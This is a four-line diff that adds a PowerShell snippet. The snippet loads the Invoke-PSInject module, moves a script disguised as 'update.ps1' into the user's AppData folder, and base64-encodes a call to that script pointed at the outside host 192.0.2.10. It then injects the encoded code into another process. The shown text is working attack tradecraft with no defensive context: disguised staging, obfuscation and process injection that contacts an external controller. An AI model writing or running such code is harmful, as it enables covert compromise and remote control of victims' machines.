@@ -1,0 +1,4 @@
+Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1; update('192.0.2.10')"));
+Inject -PoshCode $pcode;
